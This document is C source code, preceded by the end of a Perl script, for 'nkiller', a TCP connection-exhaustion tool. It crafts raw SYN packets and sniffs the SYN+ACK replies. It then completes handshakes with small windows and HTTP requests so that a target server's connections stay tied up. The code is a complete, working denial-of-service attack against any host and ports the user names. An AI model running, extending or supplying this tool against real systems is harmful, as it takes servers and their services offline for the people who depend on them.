				my $ipacket = &amp;next($pcap, $temp);
				exit 1 unless $ipacket; # Timed out waiting for SYN+ACK.
				my $tcp = new Net::RawIP({tcp => {}});
				# Load $ipacket without link header into a readable data structure.
				$tcp->bset(substr($ipacket, $offset));
				$^W = 0;
				# All we want from their SYN+ACK is their sequence number.
				my ($his_seq) = $tcp->get({tcp=>['seq']});
				# It might increase the interval between retransmits with some
				# TCP implementations if we wait a little bit here.
				select(undef, undef, undef, rand $fake_rtt);
				# Send ACK for SYN+ACK and our data all in one packet.
				# The spec allows it, and it works.
				# Who told you about "three-way handshake"?
				$packet->set({ip=> {saddr=>$s_ip_str, daddr=>$d_ip_str, frag_off=>0,
									 tos=>0, id=>iint rand 50000},
							  tcp=> {source=>$s_port, dest=>$d_port, psh=>1, syn=>0,
									 ack=>1, window=>$zero_window? 0: $window,
									 ack_seq=>++$his_seq,
									 seq=>++$my_seq, data=>$data}});
				$packet->send;
				# At this point, if our second packet is not lost, the connection is
				# established. They can try to send us as much data as they want now:
				# We're not listening anymore.
				# If our second packet is lost, they'll have a SYN_RCVD connection.
				# Hopefully, they can handle even a SYN flood.
				exit 0;
			  }
			}

			exit(0);

			sub usage
			{
			die <<EOF;
			Usage: $0 [-vzw#r#d#i#t#p#] <host>
					-v: Be verbose. Recommended for interactive use.
					-z: Close TCP window at the end of the conversation.
					-p: Port HTTP daemon is running on (default: 80).
					-t: Timeout for SYN+ACK to come (default: 1s, must be integer).
					-r: Max fake rtt, sleep between S+A and data packets (defeault: 0.05s).
					-u: URL to request (default: `/').
					-w: Window size (default: 16384). Can change the type of attack.
					-i: Max sleep between `connections' (default: 0.5s).
					-d: How many times to try to hit (default: infinity).

			See "perldoc netkill" for more information.
			EOF
			}

 */

/*
 * Theoretical Idea first posted here:  
 *   http://seclists.org/bugtraq/2000/Apr/0152.html
 *
 * COMPILATION:
 * 	gcc nkiller.c -o nkiller -lpcap -lssl -Wall -O2
 *
 * It has been tested and compiles successfully on Linux 2.6.26 and 
 * FreeBSD 6.2/8.0
 */


/*
 * Enable BSD-style (struct ip) support on Linux.
 */
#ifdef __linux__
# ifndef __FAVOR_BSD
#  define __FAVOR_BSD
# endif
# ifndef __USE_BSD
#  define __USE_BSD
# endif
# ifndef _BSD_SOURCE
#  define _BSD_SOURCE
# endif
#endif

# define IPPORT_MAX 65535u

#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <openssl/hmac.h>

#include <errno.h>
#include <pcap.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <time.h>
#include <unistd.h>


#define	DEFAULT_KEY		"NETDOS1337"
#define	DEFAULT_NUM_PROBES	100
#define	DEFAULT_POLLTIME	100000
#define	DEFAULT_SLEEP_TIME	10000

#define	WEB_PAYLOAD		"GET / HTTP/1.0\015\012\015\012"

/* Timeval subtraction in microseconds */
#define TIMEVAL_SUBTRACT(a, b) \
    (((a).tv_sec - (b).tv_sec) * 1000000L + (a).tv_usec - (b).tv_usec)

/*
 * Pseudo-header used for checksumming; this header should never reach the
 * wire
 */
typedef struct pseudo_hdr {
	uint32_t src;
	uint32_t dst;
	unsigned char mbz;
	unsigned char proto;
	uint16_t len;
} pseudo_hdr;


/*
 * Ethernet header stuff.
 */
#define	ETHER_ADDR_LEN	6
#define	SIZE_ETHERNET	14
typedef struct ethernet {
	u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
	u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
	u_short ether_type; /* Frame type */
} ether_hdr;


/*
 * Global nkiller options struct
 */
typedef struct Options {
	char target[16];
	char skey[30];
	char payload[200];
	char url[200];
	uint16_t *portlist;
	unsigned int probes; 	/* total number of fully-connected probes */
	unsigned int polltime;
	unsigned int sleep;	/* sleep time between each probe */
	int dynamic;		/* remove ports from list when we get RST */
	int delay;
	int verbose;
	int debug;  		/* some debugging info */
	int debug2; 		/* ALL debugging info */
} Options;

/*
 * Port list types
 */
typedef struct port_elem {
	uint16_t port_val;
	struct port_elem *next;
} port_elem;

typedef struct port_list {
	port_elem *first;
	port_elem *last;
} port_list;

/*
 * Per-host information
 */
typedef struct HostInfo {
	struct in_addr daddr;   /* ip address */
	char *payload;
	char *url;
	size_t plen; 		/* payload length */
	size_t wlen; 		/* url request length */
	port_list ports; 	/* linked list of ports */
	unsigned int portlen;	/* how many ports */
} HostInfo;


typedef struct SniffInfo {
	struct in_addr saddr; 	/* local ip */
	pcap_if_t *dev;
	pcap_t *pd;
	unsigned int polltime;	/* how many microsecods to poll pcap */
} SniffInfo;


typedef struct Sock {
	struct in_addr saddr;
	struct in_addr daddr;
	uint16_t sport;
	uint16_t dport;
} Sock;


/* global vars */
Options o;


/**** function declarations ****/

/* helper functions */
static void fatal(const char *fmt, ...);
static void usage(void);
static void help(void);
static void *xcalloc(size_t nelem, size_t size);
static void *xmalloc(size_t size);

/* port-handling functions */
static void port_add(HostInfo *Target, uint16_t port);
static void port_remove(HostInfo *Target, uint16_t port);
static int port_exists(HostInfo *Target, uint16_t port);
static uint16_t port_get_random(HostInfo *Target);
static uint16_t *port_parse(char *portarg, unsigned int *portlen);

/* packet helper functions */
static uint16_t checksum_comp(uint16_t *addr, int len);
static void handle_payloads(HostInfo *Target);
static uint32_t calc_cookie(Sock *sockinfo);

/* sniffing functions */
static char *check_replies(HostInfo *Target, SniffInfo *Sniffer);
static void sniffer_init(HostInfo *Target, SniffInfo *Sniffer);

/* packet handling functions */
static void send_packet(char* packet, unsigned int *packetlen);
static void send_syn_probe(HostInfo *Target, SniffInfo *Sniffer);
static int complete_connection(char *reply, HostInfo *Target);
static char *build_tcpip_packet(const struct in_addr *source,
	const struct in_addr *target, uint16_t sport, uint16_t dport,
	uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
	uint16_t window, uint8_t flags, char *tcpdata, uint16_t datalen,
	unsigned int *packetlen);


/**** function definitions ****/

/*!
 * \brief Wrapper around calloc() that calls fatal when out of memory
 */
static void *
xcalloc(size_t nelem, size_t size)
{
	void *p;

	p = calloc(nelem, size);
	if (p == NULL)
		fatal("Out of memory\n");
	return p;
}

/*!
 * \brief Wrapper around xcalloc() that calls fatal() when out of memory
 */
static void *
xmalloc(size_t size)
{
	return xcalloc(1, size);
}

/*
 * vararg function called when sth _evil_ happens
 * usually in conjunction with __func__ to note
 * which function caused the RIP stat
 */
static void
fatal(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	(void) vfprintf(stderr, fmt, ap);
	va_end(ap);
	exit(EXIT_FAILURE);
}


/*!
 * \brief print a short usage summary and exit
 */
static void
usage(void)
{
	fprintf(stderr,
		"nkiller [-t addr] [-p ports] [-k key] [-n probes] [-c msec]\n"
		"        [-l payload] [-w url] [-s sleep] [-d level] [-hvy]\n"
		"Please use `-h' for detailed help.\n");
	exit(EX_USAGE);
}


/*!
 * \brief Print detailed help
 */
static void
help(void)
{
	static const char *help_message =
	"nkiller - a TCP exhaustion & stressing tool\n"
	"\n"
	"Copyright (c) 2008 ithilgore <ithilgore.ryu.L@gmail.com>\n"
	"\n"
	"nkiller is free software, covered by the GNU General Public License,\n"
	"and you are welcome to change it and/or distribute copies of it under\n"
	"certain conditions.  See the file `COPYING' in the source\n"
	"distribution of nkiller for the conditions and terms that it is\n"
	"distributed under.\n"
	"\n"
	"			      WARNING:\n"
	"The authors disclaim any express or implied warranties, including,\n"
	"but not limited to, the implied warranties of merchantability and\n"
	"fitness for any particular purpose. In no event shall the authors or\n"
	"contributors be liable for any direct, indirect, incidental, special,\n"
	"exemplary, or consequential damages (including, but not limited to,\n"
	"procurement of substitute goods or services; loss of use, data, or\n"
	"profits; or business interruption) however caused and on any theory\n"
	"of liability, whether in contract, strict liability, or tort\n"
	"(including negligence or otherwise) arising in any way out of the use\n"
	"of this software, even if advised of the possibility of such damage.\n"
	"\n"
	"Usage:\n"
	"\n"
	"    nkiller -t <target> -p <ports> [options]\n"
	"\n"
	"Mandatory:\n"
	"  -t target          The IP address of the target host.\n"
	"  -p port[,port]     A list of ports, separated by commas.  Specify\n"
	"                     only ports that are known to be open, or use -y\n"
	"                     when unsure.\n"
	"Options:\n"
	"  -c msec            Set the time, in microseconds, between each poll\n"
	"                     for packets (pcap poll timeout).\n"
	"  -d level           Set the debug level (1: some messages, 2: all)\n"
	"  -h                 Print this help message.\n"
	"  -k key             Set the key for reverse SYN cookies.\n"
	"  -l payload         Additional payload string.\n"
	"  -n probes          Set the number of probe attempts.\n"
	"  -s sleep           Average time in microseconds between each probe.\n"
	"  -w url             URL or GET request to web server.  The location\n"
	"                     a big file should work nicely here.\n"
	"  -y                 Dynamic port handling.  Remove ports from the\n"
	"                     port list if we get an RST for them.  Useful when\n"
	"                     you do not know if the port is open for sure.\n"
	"  -v                 Verbose mode.\n";

	printf("%s", help_message);
	fflush(stdout);
}


/*!
 * \brief Build a TCP packet from its constituents
 */
static char *
build_tcpip_packet(const struct in_addr *source,
		const struct in_addr *target, uint16_t sport, uint16_t dport,
		uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
		uint16_t window, uint8_t flags, char *data, uint16_t datalen,
		unsigned int *packetlen)
{
	char *packet;
	struct ip *ip;
	struct tcphdr *tcp;
	pseudo_hdr *phdr;
	char *tcpdata;

	*packetlen = sizeof(*ip) + sizeof(*tcp) + datalen;
	packet = xmalloc(*packetlen + sizeof(*phdr));
	ip = (struct ip *)packet;
	tcp = (struct tcphdr *) ((char *)ip + sizeof(*ip));
	tcpdata = (char *) ((char *)tcp + sizeof(*tcp));

	memset(packet, 0, *packetlen);

	ip->ip_v = 4;
	ip->ip_hl = 5;
	ip->ip_tos = 0;
	ip->ip_len = *packetlen; /* must be in host byte order for FreeBSD */
	ip->ip_id = htons(ipid); /* kernel will fill with random value if 0 */
	ip->ip_off = 0;
	ip->ip_ttl = ttl;
	ip->ip_p = IPPROTO_TCP;
	ip->ip_sum = checksum_comp((unsigned short *)ip, sizeof(struct ip));
	ip->ip_src.s_addr = source->s_addr;
	ip->ip_dst.s_addr = target->s_addr;

	tcp->th_sport = htons(sport);
	tcp->th_dport = htons(dport);
	tcp->th_seq = seq;
	tcp->th_ack = ack;
	tcp->th_x2 = 0;
	tcp->th_off = 5;
	tcp->th_flags = flags;
	tcp->th_win = htons(window);
	tcp->th_urp = 0;

	memcpy(tcpdata, data, datalen);

	/* pseudo header used for checksumming */
	phdr = (struct pseudo_hdr *) ((char *)packet + *packetlen);
	phdr->src = source->s_addr;
	phdr->dst = target->s_addr;
	phdr->mbz = 0;
	phdr->proto = IPPROTO_TCP;
	phdr->len = ntohs(sizeof(*tcp) + datalen);
	/* tcp checksum */
	tcp->th_sum = checksum_comp((unsigned short *)tcp,
			*packetlen - sizeof(*ip) + sizeof(*phdr));

	return packet;
}


static void
send_packet(char* packet, unsigned int *packetlen)
{
	struct sockaddr_in sin;
	int sockfd, one;

	sin.sin_family = AF_INET;
	sin.sin_port = ((struct tcphdr *)(packet + sizeof(struct ip)))->th_dport;
	sin.sin_addr.s_addr = ((struct ip *)(packet))->ip_dst.s_addr;

	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
		fatal("cannot open socket");

	one = 1;
	setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *) &one,
			sizeof(one));

	if (sendto(sockfd, packet, *packetlen, 0,
				(struct sockaddr *)&sin, sizeof(sin)) < 0) {
		fatal("sendto error: ");
	}
	close(sockfd);
	free(packet);
}


static void
send_syn_probe(HostInfo *Target, SniffInfo *Sniffer)
{
	char *packet;
	uint16_t sport, dport;
	uint32_t encoded_seq;
	unsigned int packetlen;
	Sock *sockinfo;

	sockinfo = xmalloc(sizeof(*sockinfo));


	sport = (1024 + rand()) % 65536;
	dport = port_get_random(Target);

	/* calculate reverse cookie and encode value into sequence number */
	sockinfo->saddr.s_addr = Sniffer->saddr.s_addr;
	sockinfo->daddr.s_addr = Target->daddr.s_addr;
	sockinfo->sport = sport;
	sockinfo->dport = dport;
	encoded_seq = calc_cookie(sockinfo);

	packet = build_tcpip_packet(
			&Sniffer->saddr,
			&Target->daddr,
			sport,
			dport,
			encoded_seq,
			0,
			64,
			rand() % (uint16_t)~0,
			1024,
			TH_SYN,
			NULL,
			0,
			&packetlen
			);

	send_packet(packet, &packetlen);

	free(sockinfo);
}


/* perform pcap polling (until a certain timeout) and
 * return the packet you got - also check that the
 * packet we get is something we were expecting, according
 * to the reverse cookie we had set in the tcp seq field
 */
static char *
check_replies(HostInfo *Target, SniffInfo *Sniffer)
{

	int timedout = 0;
	int goodone = 0;
	const u_char *packet = NULL;
	char *reply = NULL;
	struct pcap_pkthdr phead;
	struct timeval now, wait;
	const struct ip *ip;
	const struct tcphdr *tcp;
	struct Sock sockinfo;
	uint32_t decoded_seq;
	uint32_t temp1, temp2;
	uint16_t datagram_len;


	if (gettimeofday(&wait, NULL) < 0)
		fatal("couldn't get time of day\n"); /* this shouldn't happen */
	wait.tv_usec += Sniffer->polltime; /* poll for $polltime micro seconds */

	do {
		datagram_len = 0;
		packet = pcap_next(Sniffer->pd, &phead);
		if (gettimeofday(&now, NULL) < 0)
			fatal("couldn't get time of day\n");
		if (TIMEVAL_SUBTRACT(wait, now) < 0) {
			/* if (o.debug2)
			   (void) fprintf(stdout, "pcap polling timed out\n"); */
			timedout++;
		}

		if (packet == NULL)
			continue;

		/* this only works on Ethernet - be warned */
		if (*(packet + 12) != 0x8) {
			break; /* not an IPv4 packet */
		}

		ip = (const struct ip *) (packet + SIZE_ETHERNET);

		/* ip/tcp header checking - end cases are more than the ones
		 * checked below - but are so rarely happening that for
		 * now we won't go into trouble to validate - could also
		 * use validedpkt() from nmap/tcpip.cc
		 */
		if (ip->ip_hl < 5) {
			if (o.debug2)
				(void) fprintf(stderr, "ip header < 20 bytes\n");
			break;
		}
		if (ip->ip_p != IPPROTO_TCP) {
			if (o.debug2)
				(void) fprintf(stderr, "packet not TCP\n");
			break;
		}

		datagram_len = ntohs(ip->ip_len); /* save length for later */

		tcp = (const void *) ((const char *)ip + ip->ip_hl * 4);
		if (tcp->th_off < 5) {
			if (o.debug2)
				(void) fprintf(stderr, "tcp header < 20 bytes\n");
			break;
		}
		if (tcp->th_flags & TH_ACK) {

			/* we swap the values accordingly since we want to
			 * check the result with the 4tuple we had created
			 * when sending our own syn probe
			 */
			sockinfo.saddr.s_addr = ip->ip_dst.s_addr;
			sockinfo.daddr.s_addr = ip->ip_src.s_addr;
			sockinfo.sport = ntohs(tcp->th_dport);
			sockinfo.dport = ntohs(tcp->th_sport);
			decoded_seq = calc_cookie(&sockinfo);


			temp1 = ntohl(tcp->th_ack) - 1;
			temp2 = ntohl(decoded_seq);
			/* there is a problem when comparing directly two 
			 * values returned by the ntohl functions - thus the 
			 * need of temp
			 */
			if (temp1 != temp2)
				break;

			/* that's our packet: a reply to something we have sent */

			if (o.dynamic && port_exists(Target, sockinfo.dport)) {
				if (o.debug2)
					(void) fprintf(stderr, "port doesn't "
					"exist in list - probably removed it "
					"before due to an RST and dynamic "
					"handling\n");
				break;
			}

			if (tcp->th_flags & TH_SYN) {
				goodone++;
				if (o.debug)
					(void) fprintf(stdout,
					"got SYN packet with seq: %x our port: "
					"%u target port: %u\n", decoded_seq,
					sockinfo.sport, sockinfo.dport);

			} else if (tcp->th_flags & TH_RST) {
				 /* if we get an RST packet this means port is
				 * closed and thus we remove the port from our
				 * port list
				 */
				if (o.debug2)
					(void) fprintf(stdout,
					"oh oh! got an RST packet with seq: %x"
					" port %u is closed\n",decoded_seq,
					sockinfo.dport);
				if (o.dynamic)
					port_remove(Target, sockinfo.dport);
			}
		}
	} while (!timedout && !goodone);

	if (goodone) {
		reply = xmalloc(datagram_len);
		memcpy(reply, packet + SIZE_ETHERNET, datagram_len);
	}

	/* return the IP datagram */
	return reply;
}




/* complete 3way handshake on the given port,
 * assuming that we get a valid packet from the caller
 * the (char *reply) is the ACK datagram (2nd step of handshake)
 */
static int
complete_connection(char *reply, HostInfo *Target)
{
	char *packet;
	unsigned int packetlen;
	uint32_t ack;
	struct ip *ip;
	struct tcphdr *tcp;

	ip = (struct ip *) reply;
	tcp = (struct tcphdr *) ((char *)ip + ip->ip_hl * 4);
	ack = ntohl(tcp->th_seq) + 1;


	packet = build_tcpip_packet(
			&ip->ip_dst,  /* mind the swapping */
			&ip->ip_src,
			ntohs(tcp->th_dport),
			ntohs(tcp->th_sport),
			tcp->th_ack, /* as seq field */
			htonl(ack),
			64,
			rand() % (uint16_t)~0,
			1024,
			TH_ACK,
			(ntohs(tcp->th_sport) == 80)?Target->url:Target->payload,
			(ntohs(tcp->th_sport) == 80)?Target->wlen:Target->plen,
			&packetlen
			);

	send_packet(packet, &packetlen);

	return 0;
}

/* reverse(or client) syn_cookie function - encode the 4tuple
 * { src ip, src port, dst ip, dst port } and a secret key into the sequence
 * number, thus keeping info of the packet inside itself
 * (idea taken by scanrand)
 */
static uint32_t
calc_cookie(Sock *sockinfo)
{

	uint32_t seq;
	unsigned int cookie_len;
	unsigned int input_len;
	unsigned char *input;
	unsigned char cookie[EVP_MAX_MD_SIZE];

	input_len = sizeof(*sockinfo);
	input = xmalloc(input_len);
	memcpy(input, sockinfo, sizeof(*sockinfo));

	/* calculate a sha1 hash based on the quadruple and the skey */
	HMAC(EVP_sha1(), (char *)o.skey, strlen(o.skey), input, input_len,
			cookie, &cookie_len);

	free(input);

	/* get only the first 32 bits of the sha1 hash */
	memcpy(&seq, &cookie, sizeof(seq));
	return seq;
}


static void
sniffer_init(HostInfo *Target, SniffInfo *Sniffer)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program bpf;
	struct pcap_addr *address;
	struct sockaddr_in *ip;
	char filter[27];

	strcpy((char *)&filter, "src host ");
	strncpy((char *)&filter[9], inet_ntoa(Target->daddr), 16);
	if (o.debug)
		(void) fprintf(stdout, "filter: %s\n", filter);

	if ((pcap_findalldevs(&Sniffer->dev, errbuf)) == -1)
		fatal("%s: pcap_findalldevs(): %s\n", __func__, errbuf);

	address = Sniffer->dev->addresses;
	address = address->next;                /* first address is garbage */

	if (address->addr) {
		ip = (struct sockaddr_in *) address->addr;
		memcpy(&Sniffer->saddr, &ip->sin_addr, sizeof(struct in_addr));
		if (o.verbose) {
			(void) fprintf(stdout, "local IP: %s\ndevice name: "
			"%s\n", inet_ntoa(Sniffer->saddr), Sniffer->dev->name);
		}
	} else
		fatal("%s: couldn't find associated IP with interface %s\n",
				__func__, Sniffer->dev->name);

	if ((Sniffer->pd = 
	pcap_open_live(Sniffer->dev->name, BUFSIZ, 0, 0, errbuf)) == NULL)
		fatal("%s: Could not open device %s: error: %s\n ", __func__,
				Sniffer->dev->name, errbuf);

	if (pcap_compile(Sniffer->pd , &bpf, filter, 0, 0) == -1)
		fatal("%s: Couldn't parse filter %s: %s\n ", __func__, filter,
				pcap_geterr(Sniffer->pd));

	if (pcap_setfilter(Sniffer->pd, &bpf) == -1)
		fatal("%s: Couldn't install filter %s: %s\n", __func__, filter,
				pcap_geterr(Sniffer->pd));

	if (pcap_setnonblock(Sniffer->pd, 1, NULL) < 0)
		fprintf(stderr, "couldn't set nonblocking mode\n");
}


static uint16_t *
port_parse(char *portarg, unsigned int *portlen)
{
	char *endp;
	uint16_t *ports;
	unsigned int nports;
	unsigned long pvalue;
	char *temp;
	*portlen = 0;

	ports = xmalloc(65535 * sizeof(uint16_t));
	nports = 0;

	while (nports < 65535) {
		if (nports == 0)
			temp = strtok(portarg, ",");
		else
			temp = strtok(NULL, ",");

		if (temp == NULL)
			break;

		endp = NULL;
		pvalue = strtoul(temp, &endp, 0);
		if (errno != 0 || *endp != '\0') {
			fprintf(stderr, "Invalid port number: %s\n",
					temp);
			goto cleanup;
		}

		if (pvalue > IPPORT_MAX) {
			fprintf(stderr, "Port number too large: %s\n",
					temp);
			goto cleanup;
		}

		ports[nports++] = (uint16_t)pvalue;
	}
	if (portlen != NULL)
		*portlen = nports;
	return ports;

cleanup:
	free(ports);
	return NULL;
}


/*
 * check if port is in list
 * return 0 if it is, -1 if not
 * (similar to port_remove in logic)
 */
static int
port_exists(HostInfo *Target, uint16_t port)
{
	port_elem *current;
	port_elem *before;

	current = Target->ports.first;
	before = Target->ports.first;

	while (current->port_val != port && current->next != NULL) {
		before = current;
		current = current->next;
	}

	if (current->port_val != port && current->next == NULL) {
		if (o.verbose)
			(void) fprintf(stderr, "%s: port %u doesn't exist in "
			"list\n", __func__, port);
		return -1;
	} else
		return 0;
}


/* remove specific port from portlist */
static void
port_remove(HostInfo *Target, uint16_t port)
{
	port_elem *current;
	port_elem *before;

	current = Target->ports.first;
	before = Target->ports.first;

	while (current->port_val != port && current->next != NULL) {
		before = current;
		current = current->next;
	}

	if (current->port_val != port && current->next == NULL) {
		if (current != Target->ports.first) {
			if (o.verbose)
				(void) fprintf(stderr, "port %u not found in "
				"list\n", port);
			return;
		}
	}

	if (current != Target->ports.first) {
		before->next = current->next;
	} else {
		Target->ports.first = current->next;
	}
	Target->portlen--;
	if (!Target->portlen)
		fatal("no port left to hit!\n");
}


/*
 * add new port to port linked list of Target
 */
static void
port_add(HostInfo *Target, uint16_t port)
{
	port_elem *current;
	port_elem *newNode;

	newNode = xmalloc(sizeof(*newNode));

	newNode->port_val = port;
	newNode->next = NULL;

	if (Target->ports.first == NULL) {
		Target->ports.first = newNode;
		Target->ports.last = newNode;
		return;
	}

	current = Target->ports.last;
	current->next = newNode;
	Target->ports.last = newNode;
}


/* return a random port from portlist */
static uint16_t
port_get_random(HostInfo *Target)
{
	port_elem *temp;
	int i, offset;

	temp = Target->ports.first;
	offset = (rand() % Target->portlen);
	i = 0;
	while (i < offset) {
		temp = temp->next;
		i++;
	}
	return temp->port_val;
}


static void
handle_payloads(HostInfo *Target)
{

	if (o.payload[0]) {
		Target->plen = strlen(o.payload);
		Target->payload = xmalloc(Target->plen);
		strncpy(Target->payload, o.payload, Target->plen);
	} else {
		Target->payload = NULL;
		Target->plen = 0;
	}

	/* send payload for additional stressing, if we deal with a web server */
	if (o.url[0]) {
		Target->wlen = strlen(o.url) + 
			sizeof("GET  HTTP/1.0\015\012\015\012") - 1;
		Target->url = xmalloc(Target->wlen + 1); 
		/* + 1 for trailing '\0' of snprintf() */
		snprintf(Target->url, Target->wlen + 1, 
			"GET %s HTTP/1.0\015\012\015\012", o.url);
	} else {
		Target->wlen = sizeof(WEB_PAYLOAD) - 1;
		Target->url = xmalloc(Target->wlen);
		memcpy(Target->url, WEB_PAYLOAD, Target->wlen);
	}

}


/* no way you have seen this before! */
static uint16_t
checksum_comp(uint16_t *addr, int len)
{

	register long sum = 0;
	uint16_t checksum;
	int count = len;
	uint16_t temp;

	while (count > 1)  {
		temp = *addr++;
		sum += temp;
		count -= 2;
	}
	if (count > 0)
		sum += *(char *) addr;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	checksum = ~sum;
	return checksum;
}


int
main(int argc, char **argv)
{
	int print_help;
	int opt;
	int required;
	int debug_level;
	size_t i;
	unsigned int portlen;
	unsigned int probes;
	HostInfo *Target;
	SniffInfo *Sniffer;
	char *reply;


	srand(time(0));

	if (argc == 1) {
		usage();
	}

	memset(&o, 0, sizeof(o));
	required = 0;
	portlen = 0;
	print_help = 0;

	/* option parsing */
	while ((opt = getopt(argc, argv, "t:k:l:w:c:p:n:vd:s:yh")) != -1)
	{
		switch (opt)
		{
			case 't':   /* target address */
				strncpy(o.target, optarg, sizeof(o.target));
				required++;
				break;
			case 'k':   /* secret key */
				strncpy(o.skey, optarg, sizeof(o.skey));
				break;
			case 'l':   /* payload */
				strncpy(o.payload, optarg, sizeof(o.payload) - 1);
				break;
			case 'w':  /* url */
				strncpy(o.url, optarg, sizeof(o.url) - 1);
				break;
			case 'c':   /* polltime */
				o.polltime = atoi(optarg);
				break;
			case 'p':   /* destination port */
				if (!(o.portlist = port_parse(optarg, &portlen))) 
					fatal("Couldn't parse ports!\n");
				required++;
				break;
			case 'n':   /* number of probes */
				o.probes = atoi(optarg);
				break;
			case 'v':   /* verbose mode */
				o.verbose = 1;
				break;
			case 'd':   /* debug mode */
				debug_level = atoi(optarg);
				if (debug_level != 1 && debug_level != 2)
					fatal("debug level must be 1 or 2\n");
				else if (debug_level == 1)
					o.debug++;
				else {
					o.debug2++;
					o.debug++;
				}
				break;
			case 's':   /* sleep time between each probe */
				o.sleep = atoi(optarg);
				break;
			case 'y':   /* dynamic port handling */
				o.dynamic++;
				break;
			case 'h':   /* help - usage */
				print_help = 1;
				break;
			case '?':   /* error */
				usage();
				break;
		}
	}

	if (print_help != 0) {
		help();
		exit(EXIT_SUCCESS);
	}

	if (getuid() && geteuid())
		fatal("need to be root\n");

	if (required < 2)
		fatal("must define both -t <target> and -p <portlist>\n");

	if (!o.sleep) {
		o.sleep = DEFAULT_SLEEP_TIME;
		if (o.verbose)
			(void) fprintf(stdout, "using default sleep time %u "
			"microseconds\n", DEFAULT_SLEEP_TIME);
	}

	Target = xmalloc(sizeof(HostInfo));
	Sniffer = xmalloc(sizeof(SniffInfo));

	Target->portlen = portlen;
	for (i = 0; i < Target->portlen; i++) {
		port_add(Target, o.portlist[i]);
	}

	inet_pton(AF_INET, o.target, &Target->daddr);

	/* some option manipulation */

	if (!o.skey[0]) {
		strncpy(o.skey, DEFAULT_KEY, sizeof(o.skey));
		if (o.verbose)
			(void) fprintf(stdout, "using default skey: %s\n",
					o.skey);
	}

	if (o.polltime > 0)
		Sniffer->polltime = o.polltime;
	else {
		if (o.verbose)
			(void) fprintf(stdout, "using default pcap polling "
			"time: %u microseconds\n", DEFAULT_POLLTIME);
		Sniffer->polltime = DEFAULT_POLLTIME;
	}

	if (o.probes > 0)
		probes = o.probes;
	else {
		if (o.verbose)
			(void) fprintf(stdout, "using default number of probes"
			": %u\n", DEFAULT_NUM_PROBES);
		probes = DEFAULT_NUM_PROBES;
	}

	handle_payloads(Target);
	sniffer_init(Target, Sniffer);

	/* main loop */
	while (probes) {
		/* as it is, there is the possibility of sending more probes
		 * than we get, since pcap polling might time out - and we only
		 * care about completing as many requests as defined in $probes
		 * the additional probes that have not been answered will either
		 * create a syn flood or will have already been dropped
		 */
		send_syn_probe(Target, Sniffer);
		usleep(o.sleep);  /* wait a bit before each probe */
		reply = check_replies(Target, Sniffer);
		if (reply) {
			complete_connection(reply, Target);
			probes--; /* reduce probes left when we actually
				   * complete a handshake */
			free(reply);
		}
	}

	exit(EXIT_SUCCESS);
}
